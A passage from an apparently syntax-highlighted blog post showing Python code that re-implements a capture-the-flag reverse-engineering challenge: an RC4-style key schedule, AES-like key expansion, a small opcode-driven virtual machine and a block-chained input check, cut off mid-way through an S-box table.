class="line">    k = []</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</span><br><span class="line">        s.append(i)</span><br><span class="line">        k.append(key[i % <span class="hljs-built_in">len</span>(key)])</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="hljs-built_in">ord</span>(k[i])) % <span class="hljs-number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p2</span>(<span class="hljs-params">key</span>):</span></span><br><span class="line">    w = [</span><br><span class="line">        <span class="hljs-number">0</span>] * <span class="hljs-number">44</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):</span><br><span class="line">        w[i] = struct.unpack(<span class="hljs-string">'&lt;I'</span>, key[i * <span class="hljs-number">4</span>:i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]</span><br><span class="line">    cnt = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">44</span>, <span class="hljs-number">1</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>:</span><br><span class="line">            w[i] = w[i - <span class="hljs-number">4</span>] ^ T(w[i - <span class="hljs-number">1</span>], cnt)</span><br><span class="line">            cnt += <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            w[i] = w[i - <span class="hljs-number">4</span>] ^ w[i - <span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> w</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p3</span>(<span class="hljs-params">s, p</span>):</span></span><br><span class="line">    i = j = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p)):</span><br><span class="line">        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="hljs-number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        p[z] ^= s[(s[i] + s[j]) % <span class="hljs-number">256</span>]</span><br><span class="line">    <span class="hljs-keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F1</span>(<span class="hljs-params">part1, part2</span>):</span></span><br><span class="line">    <span class="hljs-keyword">global</span> REG</span><br><span class="line">    REG = {</span><br><span class="line">        <span class="hljs-string">'EAX'</span>: <span class="hljs-number">0</span>,</span><br><span class="line">        <span class="hljs-string">'EBX'</span>: <span class="hljs-number">0</span>,</span><br><span class="line">        <span class="hljs-string">'ECX'</span>: <span class="hljs-number">0</span>,</span><br><span class="line">        <span class="hljs-string">'EDX'</span>: <span class="hljs-number">0</span>,</span><br><span class="line">        <span class="hljs-string">'R8'</span>: <span class="hljs-number">0</span>,</span><br><span class="line">        <span class="hljs-string">'CNT'</span>: <span class="hljs-number">0</span>,</span><br><span class="line">        <span class="hljs-string">'EIP'</span>: <span class="hljs-number">0</span>}</span><br><span class="line">    REG[<span class="hljs-string">'EAX'</span>] = part1</span><br><span class="line">    REG[<span class="hljs-string">'EBX'</span>] = part2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F2</span>(<span class="hljs-params">v1, v2, v3</span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> v1 == <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> = extendKey[<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v3)]}</span>]"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] = extendKey[REG[reg_table[<span class="hljs-built_in">str</span>(v3)]]]</span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">2</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> = <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v3)]}</span>"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] = REG[reg_table[<span class="hljs-built_in">str</span>(v3)]]</span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">3</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> = <span class="hljs-subst">{v3}</span>"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] = v3</span><br><span class="line"></span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F3</span>(<span class="hljs-params">v1, v2, v3</span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> v1 == <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(</span><br><span class="line">            <span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> = <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> + extendKey[<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v3)]}</span>] &amp; 0xFFFFFFFF"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] = REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] + \</span><br><span class="line">            extendKey[REG[reg_table[<span class="hljs-built_in">str</span>(v3)]]] &amp; <span class="hljs-number">0xFFFFFFFF</span></span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">2</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(</span><br><span class="line">            <span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> = <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> + <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v3)]}</span> &amp; 0xFFFFFFFF"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] = REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] + \</span><br><span class="line">            REG[reg_table[<span class="hljs-built_in">str</span>(v3)]] &amp; <span class="hljs-number">0xFFFFFFFF</span></span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">3</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(</span><br><span class="line">            <span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> = <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> + <span class="hljs-subst">{v3}</span> &amp; 0xFFFFFFFF"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] = REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] + v3 &amp; <span class="hljs-number">0xFFFFFFFF</span></span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F4</span>(<span class="hljs-params">v1, v2</span>):</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v1)]}</span> ^= <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span>"</span>)</span><br><span class="line">    REG[reg_table[<span class="hljs-built_in">str</span>(v1)]] ^= REG[reg_table[<span class="hljs-built_in">str</span>(v2)]]</span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F5</span>(<span class="hljs-params">v1, v2</span>):</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v1)]}</span> &amp;= <span class="hljs-subst">{v2}</span>"</span>)</span><br><span class="line">    REG[reg_table[<span class="hljs-built_in">str</span>(v1)]] &amp;= v2</span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F6</span>(<span class="hljs-params">v1, v2, v3</span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> v1 == <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> -= extendKey[<span class="hljs-subst">{v3}</span>]"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] -= extendKey[v3]</span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">2</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> -= <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v3)]}</span>"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] -= REG[reg_table[<span class="hljs-built_in">str</span>(v3)]]</span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">3</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> -= <span class="hljs-subst">{v3}</span>"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] -= v3</span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F7</span>(<span class="hljs-params">v1, v2</span>):</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v1)]}</span> |= <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span>"</span>)</span><br><span class="line">    REG[reg_table[<span class="hljs-built_in">str</span>(v1)]] |= REG[reg_table[<span class="hljs-built_in">str</span>(v2)]]</span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F8</span>(<span class="hljs-params">v1, v2</span>):</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(</span><br><span class="line">        <span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v1)]}</span> = <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v1)]}</span> &gt;&gt; <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> &amp; 0xFFFFFFFF"</span>)</span><br><span class="line">    REG[reg_table[<span class="hljs-built_in">str</span>(v1)]] = REG[reg_table[<span class="hljs-built_in">str</span>(v1)]</span><br><span class="line">                                  ] &gt;&gt; REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] &amp; <span class="hljs-number">0xFFFFFFFF</span></span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F9</span>(<span class="hljs-params">v1, v2</span>):</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(</span><br><span class="line">        <span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v1)]}</span> = <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v1)]}</span> &lt;&lt; <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> &amp; 0xFFFFFFFF"</span>)</span><br><span class="line">    REG[reg_table[<span class="hljs-built_in">str</span>(v1)]] = REG[reg_table[<span class="hljs-built_in">str</span>(v1)]</span><br><span class="line">                                  ] &lt;&lt; REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] &amp; <span class="hljs-number">0xFFFFFFFF</span></span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FA</span>(<span class="hljs-params">v1, v2, v3</span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> v1 == <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> *= extendKey[<span class="hljs-subst">{v3}</span>]"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] *= extendKey[v3]</span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">2</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> *= <span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v3)]}</span>"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] *= REG[reg_table[<span class="hljs-built_in">str</span>(v3)]]</span><br><span class="line">    <span class="hljs-keyword">elif</span> v1 == <span class="hljs-number">3</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{reg_table[<span class="hljs-built_in">str</span>(v2)]}</span> *= <span class="hljs-subst">{v3}</span>"</span>)</span><br><span class="line">        REG[reg_table[<span class="hljs-built_in">str</span>(v2)]] *= v3</span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FB</span>():</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"R8 = CNT == 21"</span>)</span><br><span class="line">    REG[<span class="hljs-string">'R8'</span>] = REG[<span class="hljs-string">'CNT'</span>] == <span class="hljs-number">21</span></span><br><span class="line">    REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">WC</span>():</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">"if R8 != 0: break"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> REG[<span class="hljs-string">'R8'</span>]:</span><br><span class="line">        REG[<span class="hljs-string">'EIP'</span>] = <span class="hljs-number">16</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        REG[<span class="hljs-string">'EIP'</span>] += <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">VM</span>(<span class="hljs-params">part1, part2</span>):</span></span><br><span class="line">    F1(part1, part2)</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:</span><br><span class="line">        EIP = REG[<span class="hljs-string">'EIP'</span>]</span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">80</span>:</span><br><span class="line">            <span class="hljs-comment"># print(</span></span><br><span class="line">            <span class="hljs-comment">#     f"F2({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})")</span></span><br><span class="line">            F2(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>], opcode[EIP + <span class="hljs-number">3</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">29</span>:</span><br><span class="line">            <span class="hljs-comment"># print(</span></span><br><span class="line">            <span class="hljs-comment">#     f"F3({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})")</span></span><br><span class="line">            F3(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>], opcode[EIP + <span class="hljs-number">3</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">113</span>:</span><br><span class="line">            <span class="hljs-comment"># print(f"F4({opcode[EIP + 1]}, {opcode[EIP + 2]})")</span></span><br><span class="line">            F4(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">114</span>:</span><br><span class="line">            <span class="hljs-comment"># print(f"F5({opcode[EIP + 1]}, {opcode[EIP + 2]})")</span></span><br><span class="line">            F5(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">150</span>:</span><br><span class="line">            <span class="hljs-comment"># print(</span></span><br><span class="line">            <span class="hljs-comment"># f"F6({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})")</span></span><br><span class="line">            F6(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>], opcode[EIP + <span class="hljs-number">3</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">87</span>:</span><br><span class="line">            <span class="hljs-comment"># print(f"F7({opcode[EIP + 1]}, {opcode[EIP + 2]})")</span></span><br><span class="line">            F7(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">116</span>:</span><br><span class="line">            <span class="hljs-comment"># print(f"F8({opcode[EIP + 1]}, {opcode[EIP + 2]})")</span></span><br><span class="line">            F8(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">41</span>:</span><br><span class="line">            <span class="hljs-comment"># print(f"F9({opcode[EIP + 1]}, {opcode[EIP + 2]})")</span></span><br><span class="line">            F9(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">220</span>:</span><br><span class="line">            <span class="hljs-comment"># print(</span></span><br><span class="line">            <span class="hljs-comment"># f"FA({opcode[EIP + 1]}, {opcode[EIP + 2]}, {opcode[EIP + 3]})")</span></span><br><span class="line">            FA(opcode[EIP + <span class="hljs-number">1</span>], opcode[EIP + <span class="hljs-number">2</span>], opcode[EIP + <span class="hljs-number">3</span>])</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">7</span>:</span><br><span class="line">            <span class="hljs-comment"># print("FB()")</span></span><br><span class="line">            FB()</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> opcode[EIP] == <span class="hljs-number">153</span>:</span><br><span class="line">            <span class="hljs-comment"># print("WC()")</span></span><br><span class="line">            WC()</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Have</span>():</span></span><br><span class="line">    Hello = <span class="hljs-string">'                                                                                                                                                                                                                                                \n||   / |  / /                                                                     \n||  /  | / /  ___     //  ___      ___      _   __      ___       __  ___  ___    \n|| / /||/ / //___) ) // //   ) ) //   ) ) // ) )  ) ) //___) )     / /   //   ) ) \n||/ / |  / //       // //       //   / / // / /  / / //           / /   //   / /  \n|  /  | / ((____   // ((____   ((___/ / // / /  / / ((____       / /   ((___/ /   \n                                                                                            \n                                                                                            \n||   / |  / / /|    //| |     //   ) ) /__  ___/ //   / / ___      ___      ___      ___    \n||  /  | / / //|   // | |    //          / /    //___   //   ) ) //   ) ) //   ) ) //   ) ) \n|| / /||/ / // |  //  | |   //          / /    / ___     ___/ / //   / /   ___/ /   __ / /  \n||/ / |  / //  | //   | |  //          / /    //       / ____/ //   / /  / ____/       ) )  \n|  /  | / //   |//    | | ((____/ /   / /    //       / /____ ((___/ /  / /____  ((___/ /     \n    '</span></span><br><span class="line">    <span class="hljs-built_in">print</span>(Hello)</span><br><span class="line">    <span class="hljs-comment"># return input('RightBack: ').encode()</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">b"abcd"</span>*<span class="hljs-number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Fun</span>(<span class="hljs-params">right</span>):</span></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(right) != <span class="hljs-number">64</span>:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">'XD'</span>)</span><br><span class="line">        exit()</span><br><span class="line">    back = <span class="hljs-string">b''</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(right), <span class="hljs-number">8</span>):</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">"============="</span>)</span><br><span class="line">        part1 = struct.unpack(<span class="hljs-string">'&gt;I'</span>, right[i + <span class="hljs-number">0</span>:i + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]</span><br><span class="line">        part2 = struct.unpack(<span class="hljs-string">'&gt;I'</span>, right[i + <span class="hljs-number">4</span>:i + <span class="hljs-number">8</span>])[<span class="hljs-number">0</span>]</span><br><span class="line">        <span class="hljs-keyword">if</span> i != <span class="hljs-number">0</span>:</span><br><span class="line">            part1 ^= struct.unpack(<span class="hljs-string">'&gt;I'</span>, back[i - <span class="hljs-number">8</span>:i - <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]</span><br><span class="line">            part2 ^= struct.unpack(<span class="hljs-string">'&gt;I'</span>, back[i - <span class="hljs-number">4</span>:i])[<span class="hljs-number">0</span>]</span><br><span class="line">        VM(part1, part2)</span><br><span class="line">        back += struct.pack(<span class="hljs-string">'&gt;I'</span>, REG[<span class="hljs-string">'EAX'</span>])</span><br><span class="line">        back += struct.pack(<span class="hljs-string">'&gt;I'</span>, REG[<span class="hljs-string">'EBX'</span>])</span><br><span class="line">    <span class="hljs-keyword">return</span> back</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    REG = {}</span><br><span class="line">    EIP = <span class="hljs-number">0</span></span><br><span class="line">    reg_table = {</span><br><span class="line">        <span class="hljs-string">'1'</span>: <span class="hljs-string">'EAX'</span>,</span><br><span class="line">        <span class="hljs-string">'2'</span>: <span class="hljs-string">'EBX'</span>,</span><br><span class="line">        <span class="hljs-string">'3'</span>: <span class="hljs-string">'ECX'</span>,</span><br><span class="line">        <span class="hljs-string">'4'</span>: <span class="hljs-string">'EDX'</span>,</span><br><span class="line">        <span class="hljs-string">'5'</span>: <span class="hljs-string">'R8'</span>,</span><br><span class="line">        <span class="hljs-string">'6'</span>: <span class="hljs-string">'CNT'</span>,</span><br><span class="line">        <span class="hljs-string">'7'</span>: <span class="hljs-string">'EIP'</span>}</span><br><span class="line">    Sbox = [</span><br><span class="line">        <span class="hljs-number">82</span>,</span><br><span class="line">        <span class="hljs-number">9</span>,</span><br><span class="line">        <span class="hljs-number">106</span>,</span><br><span class="line">        <span class="hljs-number">213</span>,</span><br><span class="line">        <span class="hljs-number">48</span>,</span><br><span class="line">        <span class="hljs-number">54</span>,</span><br><span class="line">        <span class="hljs-number">165</span>,</span><br><span class="line">        <span class="hljs-number">56</span>,</span><br><span class="line">        <span class="hljs-number">191</span>,</span><br><span class="line">        <span class="hljs-number">64</span>,</span><br><span class="line">        <span class="hljs-number">163</span>,</span><br><span class="line">        <span class="hljs-number">158</span>,</span><br><span class="line">        <span class="hljs-number">129</span>,</span><br><span class="line">        <span class="hljs-number">243</span>,</span><br><span class="line">        <span class="hljs-number">215</span>,</span><br><span class="line">        <span class="hljs-number">251</span>,</span><br><span class="line">        <span class="hljs-number">124</span>,</span><br><span class="line">        <span class="hljs-number">227</span>,</span><br><span class="line">        <span class="hljs-number">57</span>,</span><br><span class="line">        <span class="hljs-number">130</span>,</span><br><span class="line">        <span class="hljs-number">155</span>,</span><br><span class="line">        <span class="hljs-number">47</span>,</span><br><span class="line">        <span class="hljs-number">255</span>,</span><br><span class="line">        <span class="hljs-number">135</span>,</span><br><span class="line">        <span class="hljs-number">52</span>,</span><br><span class="line">        <span class="hljs-number">142</span>,</span><br><span class="line">        <span class="hljs-number">67</span>,</span><br><span class="line">        <span class="hljs-number">68</span>,</span><br><span class="line">        <span class="hljs-number">196</span>,</span><br><span class="line">        <span class="hljs-number">222</span>,</span><br><span class="line">        <span class="hljs-number">233</span>,</span><br><span class="line">        <span class="hljs-number">203</span>,</span><br><span class="line">        <span class="hljs-number">84</span>,</span><br><span class="line">        <span class="hljs-number">123</span>,</span><br><span class="line">        <span class="hljs-number">148</span>,</span><br><span class="line">        <span class="hljs-number">50</span>,</span><br><span class="line">        <span class="hljs-number">166</span>,</span><br><span class="line">        <span class="hljs-number">194</span>,</span><br><span class="line">        <span class="hljs-number">35</span>,</span><br><span class="line">        <span class="hljs-number">61</span>,</span><br><span class="line">        <span class="hljs-number">238</span>,</span><br><span class="line">        <span class="hljs-number">76</span>,</span><br><span class="line">        <span class="hljs-number">149</span>,</span><br><span class="line">        <span class="hljs-number">11</span>,</span><br><span class="line">        <span class="hljs-number">66</span>,</span><br><span class="line">        <span class="hljs-number">250</span>,</span><br><span class="line">        <span class="hljs-number">195</span>,</span><br><span class="line">        <span class="hljs-number">78</span>,</span><br><span class="line">        <span class="hljs-number">8</span>,</span><br><span class="line">        <span class="hljs-number">46</span>,</span><br><span class="line">        <span class="hljs-number">161</span>,</span><br><span class="line">        <span class="hljs-number">102</span>,</span><br><span class="line">        <span class="hljs-number">40</span>,</span><br><span class="line">        <span class="hljs-number">217</span>,</span><br><span class="line">        <span class="hljs-number">36</span>,</span><br><span class="line">        <span class="hljs-number">178</span>,</span><br><span class="line">        <span class="hljs-number">118</span>,</span><br><span class="line">        <span class="hljs-number">91</span>,</span><br><span class="line">        <span class="hljs-number">162</span>,</span><br><span class="line">        <span class="hljs-number">73</span>,</span><br><span class="line">        <span class="hljs-number">109</span>,</span><br><span class="line">        <span class="hljs-number">139</span>,</span><br><span class="line">        <span class="hljs-number">209</span>,</span><br><span class="line">        <span class="hljs-number">37</span>,</span><br><span class="line">        <span class="hljs-number">114</span>,</span><br><span class="line">        <span class="hljs-number">248</span>,</span><br><span class="line">        <span class="hljs-number">246</span>,</span><br><span class="line">        <span class="hljs-number">100</span>,</span><br><span class="line">        <span class="hljs-number">134</span>,</span><br><span class="line">        <span class="hljs-number">104</span>,</span><br><span class="line">        <span class="hljs-number">152</span>,</span><br><span class="line">        <span class="hljs-number">22</span>,</span><br><span class="line">        <span class="hljs-number">212</span>,</span><br><span class="line">        <span class="hljs-number">164</span>,</span><br><span class="line">        <span class="hljs-number">92</span>,</span><br><span class="line">        <span class="hljs-number">204</span>,</span><br><span class="line">        <span class="hljs-number">93</span>,</span><br><span class="line">        <span class="hljs-number">101</span>,</span><br><span class="line">        <span class="hljs-number">182</span>,</span><br><span class="line">        <span 